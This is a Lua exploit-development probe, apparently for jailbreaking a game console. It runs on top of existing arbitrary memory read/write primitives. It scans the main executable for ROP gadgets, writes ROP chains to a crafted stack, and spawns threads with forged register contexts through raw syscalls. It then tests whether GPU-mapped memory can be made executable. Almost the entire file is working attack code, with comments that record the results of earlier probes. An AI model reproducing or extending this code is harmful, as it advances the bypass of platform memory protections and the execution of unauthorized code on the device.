-- CRASH_CLASS: HIGH
-- PROBE 928c: executable-page oracle with a non-stub entry control
--
-- 928b answered but not cleanly: entry=fn ran the chain (out=88), and
-- entry=code_page (a page of GPU memory holding 0xC3) printed a raw dump and
-- took the process down before the parent's next line. A faulting thread is
-- fatal to the whole process here, so the page not executing and the entry
-- mechanism being broken look identical.
--
-- This probe separates them with a second control:
--   [A] entry=fn            - the stub (known good, 910a)
--   [B] entry=store gadget  - a real eboot instruction pair, `mov [rdi],rax; ret`
--                             with RDI=out2, RAX=0x1234; if it runs, out2=0x1234
--                             and the `ret` falls into the chain
--   [C] entry=code_page     - the oracle: page of GPU memory holding 0xC3
--
-- [B] surviving proves arbitrary eboot entries work, which leaves [C]'s death
-- attributable to the page itself: user-mapped memory does not execute.

print("=== PROBE 928c: exec-page oracle with a gadget-entry control ===")

local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn = to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))

local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0) * 4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off
        if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local store   = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
print(string.format("[0] rax=%X rdi=%X store=%X jmp=%X", pop_rax or 0, pop_rdi or 0, store or 0, jmp_g or 0))
if not (pop_rax and pop_rdi and store and jmp_g) then print("[!] no gadgets"); return end

local PAGE = 0x4000
local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8,
             SS=0x100, RDI=0x048, RSI=0x050, RDX=0x058, RCX=0x060, R8=0x068, RAX=0x078}
local ctx  = memory.alloc(0x500)
local tb   = memory.alloc(8)
local out1 = memory.alloc(8)
local out2 = memory.alloc(8)
local ts   = memory.alloc(16)

local function mmap(px)
    local _, a = pcall(function()
        return mk(477)(uint64(0), uint64(px), uint64(3), uint64(0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end
local function sleep_ms(ms)
    wq(ts, uint64(0)); wq(ts + 8, uint64(ms * 1000000))
    pcall(function() mk(240)(uint64(ts), uint64(0)) end)
end

local block = mmap(PAGE * 4)
if block == 0 then print("[!] mmap failed"); return end
local code_page = block
local start = block + PAGE * 4 - 0x200
print(string.format("[0] block=%X code_page=%X stack=%X", block, code_page, start))

local function spawn(cfg)
    zero(ctx, 0x500); wq(tb, uint64(0))
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));    wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(cfg.rip)); wq(ctx+Ctx.RSP, uint64(start))
    wq(ctx+Ctx.RDI, uint64(cfg.rdi or 0)); wq(ctx+Ctx.RAX, uint64(cfg.rax or 20))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok, to_num(rv)
end

--------------------------------------------------------------------
-- A: stub entry
--------------------------------------------------------------------
print("--- A: entry=fn ---")
wq(out1, uint64(0))
local ch = {pop_rdi, out1, pop_rax, 20, fn, store, pop_rdi, 0, pop_rax, 431, fn, jmp_g}
for k = 1, #ch do wq(start + (k - 1) * 8, uint64(ch[k])) end
local okA, rvA = spawn({rip = fn, rdi = 0, rax = 20})
sleep_ms(120)
print(string.format("  A ok=%s rv=%d out1=%d alive=%d", tostring(okA), rvA, rd(out1) or -1,
    to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
print("")

--------------------------------------------------------------------
-- B: eboot gadget entry, `mov [rdi],rax; ret` then the same chain
--------------------------------------------------------------------
print("--- B: entry=store gadget (writes 0x1234 to out2, ret into the chain) ---")
wq(out2, uint64(0))
wq(out1, uint64(0))
local chB = {pop_rdi, out1, pop_rax, 20, fn, store, pop_rdi, 0, pop_rax, 431, fn, jmp_g}
for k = 1, #chB do wq(start + (k - 1) * 8, uint64(chB[k])) end
local okB, rvB = spawn({rip = store, rdi = out2, rax = 0x1234})
sleep_ms(150)
print(string.format("  B ok=%s rv=%d out2=%X (want 1234) out1=%d alive=%d",
    tostring(okB), rvB, rd(out2) or 0, rd(out1) or -1,
    to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
print("")

--------------------------------------------------------------------
-- C: the oracle, last because a fault takes the process down
--------------------------------------------------------------------
print("--- C: entry=code_page (holds 0xC3) ---")
wb(code_page, 0xC3); wb(code_page + 1, 0); wb(code_page + 2, 0); wb(code_page + 3, 0)
print(string.format("  code_page dword=%X", rd(code_page) or 0))
pcall(function() mk(585)(uint64(0), uint64(code_page), uint64(PAGE), uint64(7)) end)
wq(out1, uint64(0))
for k = 1, #ch do wq(start + (k - 1) * 8, uint64(ch[k])) end
local okC, rvC = spawn({rip = code_page, rdi = 0, rax = 20})
sleep_ms(150)
print(string.format("  C ok=%s rv=%d out1=%d alive=%d", tostring(okC), rvC, rd(out1) or -1,
    to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
print("[Z] COMPLETE - survival at C means user memory executed")
print("=== PROBE 928c COMPLETE ===")
